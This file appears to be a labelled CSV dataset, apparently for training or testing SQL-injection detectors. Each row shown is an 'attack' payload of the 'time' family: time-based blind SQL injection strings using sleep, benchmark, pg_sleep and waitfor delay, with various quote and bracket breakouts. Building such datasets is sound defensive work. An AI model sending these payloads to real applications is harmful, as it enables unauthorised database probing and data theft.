label,payload,family
attack,"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'yhpp' like 'yhpp",time
attack,1'+  (  select gkve where 1943  =  1943 waitfor delay '0:0:5'  )  +',time
attack, (  select 2527 from pg_sleep  (  5   )    ) ,time
attack,1  )   as ozga where 4002  =  4002 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,time
attack,"1%""   )    )     )   waitfor delay '0:0:5' and    (    (     (  ""%""  =  """,time
attack,"1' and elt  (  1210  =  1210,sleep  (  5   )    )   ",time
attack,"1  )   as nlig where 5964  =  5964 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,1%'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,time
attack,1%'  )   rlike sleep  (  5  )  #,time
attack,"1' in boolean mode  )   or elt  (  6272  =  6272,sleep  (  5   )    )   #",time
attack,"1"" or sleep  (  5  )   and ""telb""  =  ""telb",time
attack,1'  )   where 5279  =  5279 or sleep  (  5  )  #,time
attack,select sleep  (  5  )   and    (    (     (  'qjsc'  =  'qjsc,time
attack,select sleep  (  5  )   and   (  '%'  =  ',time
attack,"1%""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  ""%""  =  """,time
attack,1   )    )    as qsos where 2721  =  2721 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,time
attack,1'+  (  select 'iyyv' where 9500  =  9500 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu   )    )   +',time
attack,"1%""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",time
attack,1  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  9505  =  9505,time
attack,"1   )    )    as hgtl where 3864  =  3864 and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,"select pg_sleep  (  5  )   and    (    (     (  ""wqeb""  =  ""wqeb",time
attack,"1"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  ",time
attack,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""qcqx"" like ""qcqx",time
attack,"1'   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  'gbhd'  =  'gbhd",time
attack,1' or sleep  (  5  )   and 'rpqn' like 'rpqn,time
attack,1%' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,time
attack,1%'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  '%'  =  ',time
attack,1'  )   where 2330  =  2330 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,time
attack,"1"" and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",time
attack,1' in boolean mode  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  #,time
attack,1  )   as iknl where 3885  =  3885 rlike sleep  (  5  )  #,time
attack,1%'  )   and sleep  (  5  )  #,time
attack,1 where 2649  =  2649 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,time
attack,"1'   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  'aiuy'  =  'aiuy",time
attack,1'  )   where 9317  =  9317 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,time
attack,"1%'   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,1%'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  '%'  =  ',time
attack,waitfor delay '0:0:5' and 'fjpf' like 'fjpf,time
attack,"1  )   as auly where 4146  =  4146 or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,"1""  )   as ybkp where 7788  =  7788 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",time
attack,"1'   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   'zjel' like 'zjel",time
attack,"1'   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  'sqzl'  =  'sqzl",time
attack,1  )   where 1100  =  1100 and sleep  (  5  )  --,time
attack,waitfor delay '0:0:5' and    (    (     (  'ywnm'  =  'ywnm,time
attack,1 where 5311  =  5311 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,time
attack,1' where 5035  =  5035 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,time
attack,"1%""   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and 'vwve' like 'vwve,time
attack,1%' and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,time
attack,"1""   )    )    as swix where 2459  =  2459 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",time
attack,"1""   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   ""alkz""  =  ""alkz",time
attack,"1  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,"elt  (  8192  =  8192,sleep  (  5   )    )   ",time
attack,"1""   )    )    as luon where 4676  =  4676 rlike sleep  (  5  )  #",time
attack,1' rlike sleep  (  5  )  #,time
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )     )  ||'",time
attack,"1%'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  '%'  =  '",time
attack,1   )    )    and sleep  (  5  )   and    (    (   9084  =  9084,time
attack,"1  )   where 5261  =  5261 and elt  (  1210  =  1210,sleep  (  5   )    )   --",time
attack,"1'   )    )    as crzr where 5373  =  5373 and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,"1""   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   ""nepk""  =  ""nepk",time
attack,1  )   where 3979  =  3979 rlike sleep  (  5  )  --,time
attack,"1""  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,"  (  select   (  case when   (  4232  =  4232  )   then   (  select benchmark  (  5000000,md5  (  0x6b637544   )    )     )   else 4232*  (  select 4232 from mysql.db  )   end   )    )   ",time
attack,1'   )    )     )   rlike sleep  (  5  )   and    (    (     (  'zwyx'  =  'zwyx,time
attack,1'   )    )     )   waitfor delay '0:0:5' and    (    (     (  'clcf'  =  'clcf,time
attack,"1'   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   'ltym'  =  'ltym",time
attack,1  )   as fxfe where 1148  =  1148 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,time
attack,"1%"" and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and ""%""  =  """,time
attack,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )    and ""zzca""  =  ""zzca",time
attack,1'   )    )    as vnwn where 8774  =  8774 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,time
attack,"1""  )   where 4971  =  4971 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",time
attack,1%'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,time
attack,"1""  )   rlike sleep  (  5  )   and   (  ""rfsd""  =  ""rfsd",time
attack,1%'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  '%'  =  ',time
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   ""uhvy""  =  ""uhvy",time
attack,"1%"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""%""  =  """,time
attack,1' waitfor delay '0:0:5' and 'vwuz'  =  'vwuz,time
attack,1%'   )    )    waitfor delay '0:0:5' and    (    (   '%'  =  ',time
attack,1'   )    )    and sleep  (  5  )  #,time
attack,1%'   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,time
attack,"1'||  (  select 'wcad' from dual where 4262  =  4262 and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,"1"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and ""wcze""  =  ""wcze",time
attack,1'  )   waitfor delay '0:0:5'--,time
attack,select pg_sleep  (  5  )  --,time
attack,1  )   where 1527  =  1527 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,time
attack,"1'   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  'zurf'  =  'zurf",time
attack,"1%""  )   or sleep  (  5  )   and   (  ""%""  =  """,time
attack,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   # macc",time
attack,"1'||  (  select 'gtri' from dual where 7097  =  7097 and elt  (  1210  =  1210,sleep  (  5   )    )     )  ||'",time
attack,"1%""   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",time
attack,"1%"" or sleep  (  5  )  #",time
attack,"1'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   'jnmf'  =  'jnmf",time
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  ""eqmy""  =  ""eqmy",time
attack,select pg_sleep  (  5  )  #,time
attack,"1""   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",time
attack,"1""  )   waitfor delay '0:0:5'--",time
attack,"select sleep  (  5  )   and ""irxg""  =  ""irxg",time
attack,1'   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,time
attack,1  )   as ztrb where 1052  =  1052 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,time
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  ""%""  =  """,time
attack,"1%""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""%""  =  """,time
attack,"1""   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   ""ejpw""  =  ""ejpw",time
attack,"1%' and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,"1""   )    )    rlike sleep  (  5  )  #",time
attack, (  select * from   (  select  (  sleep  (  5   )    )     )  lrov  ) ,time
attack,1'||  (  select 'vwls' where 5252  =  5252 rlike sleep  (  5  )  #,time
attack,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  ""sxih""  =  ""sxih",time
attack,"1""   )    )    and sleep  (  5  )  #",time
attack,"1""   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",time
attack,1'+  (  select lptb where 3861  =  3861 or sleep  (  5   )    )   +',time
attack,1   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  3332  =  3332,time
attack,"1'||  (  select 'scwx' where 6591  =  6591 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )     )  ||'",time
attack,"1""  )   as cnrh where 8524  =  8524 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",time
attack,1%'   )    )     )   or sleep  (  5  )  #,time
attack,"1""  )   as iwri where 4921  =  4921 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --",time
attack,1'   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  'qrtf'  =  'qrtf,time
attack,"1""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  ""tpxo"" like ""tpxo",time
attack,1  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,time
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  ""bqfj"" like ""bqfj",time
attack,"1""   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and ""gddl"" like ""gddl",time
attack, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  -- mmjk,time
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'xcxr' like 'xcxr",time
attack,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""tvla""  =  ""tvla",time
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   # idxq",time
attack,"1%""  )   and sleep  (  5  )  #",time
attack,"select pg_sleep  (  5  )   and    (    (   ""qani""  =  ""qani",time
attack,"1"" or sleep  (  5  )   and ""fbuo"" like ""fbuo",time
attack,"1"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",time
attack,waitfor delay '0:0:5'#,time
attack, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  '%'  =  ',time
attack,1'||  (  select 'jslz' where 8405  =  8405 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   ||',time
attack,"1   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,"1"" or sleep  (  5  )  #",time
attack,"1""  )   as nraw where 7984  =  7984 and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,1'||  (  select 'cgup' from dual where 5383  =  5383 waitfor delay '0:0:5'--,time
attack,"1"" rlike sleep  (  5  )   and ""rylv"" like ""rylv",time
attack,1  )   as bozx where 2160  =  2160 and sleep  (  5  )  #,time
attack,1'   )    )    as azsd where 3870  =  3870 waitfor delay '0:0:5'--,time
attack,"1%""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""%""  =  """,time
attack,1 where 7890  =  7890 or sleep  (  5  )  --,time
attack,"1%""  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  ""%""  =  """,time
attack,waitfor delay '0:0:5'  )  ||',time
attack,select sleep  (  5  )   and   (  'pwpc'  =  'pwpc,time
attack,"1""   )    )    as spvl where 2242  =  2242 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",time
attack,"1""  )   as uyns where 4751  =  4751 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --",time
attack,1'   )    )    as zffq where 9572  =  9572 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,time
attack,"1""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  ""uncg""  =  ""uncg",time
attack,"1%"" or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,"1""  )   where 5719  =  5719 rlike sleep  (  5  )  --",time
attack,"1""  )   where 6072  =  6072 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,"1'  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and ""ssfu""  =  ""ssfu",time
attack,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and ""plqe""  =  ""plqe",time
attack,"1'||  (  select 'drna' from dual where 5082  =  5082 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )     )  ||'",time
attack,1'  )   where 3730  =  3730 and sleep  (  5  )  #,time
attack,"1' or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,1' in boolean mode  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  #,time
attack,"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'wdoi'  =  'wdoi",time
attack,1'+  (  select somn where 8636  =  8636 rlike sleep  (  5   )    )   +',time
attack,"1'  )   where 6634  =  6634 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",time
attack,"1"" where 7344  =  7344 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --",time
attack,1   )    )     )   rlike sleep  (  5  )  #,time
